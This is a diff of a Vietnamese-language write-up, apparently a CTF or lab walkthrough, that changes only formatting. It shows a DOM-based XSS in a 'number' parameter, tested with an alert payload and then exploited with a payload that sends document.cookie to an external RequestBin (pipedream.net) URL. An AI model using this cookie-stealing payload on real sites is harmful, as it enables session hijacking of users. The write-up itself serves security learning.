@@ -4,11 +4,11 @@ Sau khi thử submit, thì ta có thể xem được script của website:
 
 <img src="./media/image1.png" style="width:6.5in;height:2.34861in" alt="Text Description automatically generated" />
 
-Lúc này, tham số number sẽ đảm nhận nhận input. Ta thử kiểm tra XSS ở ô này bằng payload **‘;alert(1)//** thì thấy thành công:
+Lúc này, tham số number sẽ đảm nhận nhận input. Ta thử kiểm tra XSS ở ô này bằng payload `‘;alert(1)//` thì thấy thành công:
 
 <img src="./media/image2.png" style="width:6.5in;height:1.01875in" alt="Graphical user interface, text, application Description automatically generated" />
 
-Ta sẽ dùng document.location để redirect website đến HTTP Request và payload để DOM based XSS như sau (ta dùng RequestBin tạo từ <https://requestbin.in>): `';document.location=%27https://eol9dtzbk9673pb.m.pipedream.net/?cookies=%27%2bdocument.cookie;//`
+Ta sẽ dùng document.location để redirect website đến HTTP Request và payload để DOM based XSS như sau (ta dùng RequestBin tạo từ https://requestbin.in): `';document.location=%27https://eol9dtzbk9673pb.m.pipedream.net/?cookies=%27%2bdocument.cookie;//`
 
 <img src="./media/image3.png" style="width:6.5in;height:0.8375in" alt="Graphical user interface, text, application Description automatically generated" />
 
